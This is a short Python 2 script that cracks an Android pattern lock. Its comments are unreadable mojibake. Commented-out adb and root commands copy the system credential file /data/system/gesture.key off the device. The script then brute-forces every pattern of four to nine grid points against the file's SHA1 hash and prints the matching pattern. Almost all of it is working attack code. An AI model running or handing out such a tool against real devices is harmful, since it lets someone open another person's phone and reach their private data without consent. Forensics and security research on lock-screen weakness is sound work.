# -*- coding: cp936 -*-
import itertools
import hashlib
import time
import os

# python2.x�汾
def getPassword():
    #����cmd��ADB���ӵ��ֻ�,��ȡSHA1���ܺ���ַ���
    # os.system("adb pull /data/system/gesture.key gesture.key")
    # time.sleep(5)
    #os.system("su -c cp /data/system/gesture.key gesture.key")
    #time.sleep(2)
    f=open('gesture.key','r')
    pswd=f.readline()
    f.close()
    pswd_hex=pswd.encode('hex')
    print u'���ܺ������Ϊ��%s'%pswd_hex

    #���ɽ������У��õ�['00','01','02','03','04','05','06','07','08']
    matrix=[]
    for i in range(0,9):
        str_temp = '0'+str(i)
        matrix.append(str_temp)

    #��00����08���ַ��������У�����ȡ4�������У����ȫ����������

    min_num=4
    max_num=len(matrix)
    #
    isFind = False

    for num in range(min_num,max_num+1):#��04 -> 08
        iter1 = itertools.permutations(matrix,num)#��9������������n����������
        list_m=[]
        list_m.append(list(iter1))#�����ɵ�����ȫ����ŵ� list_m �б���
        for el in list_m[0]:#������n�����ֵ�ȫ������
            strlist=''.join(el)#��listת����str��[00,03,06,07,08]-->0003060708
            strlist_sha1 = hashlib.sha1(strlist.decode('hex')).hexdigest()#���ַ�������SHA1����
            if pswd_hex==strlist_sha1:#���ֻ��ļ�����ַ���������ַ������жԱ�
                print u'��������Ϊ��',strlist
                isFind = True
                break
            #print u'�ڲ�--��1'
        #print u'���--��--��--��2'
        if isFind == True:
            break

if __name__ == '__main__':
    print u'���ܿ�ʼ��'
    startTimes = time.time()
    getPassword()
    endTimes = time.time()
    times = endTimes - startTimes
    print u'����ʱ��' , repr('%.2f' %times) , u'��'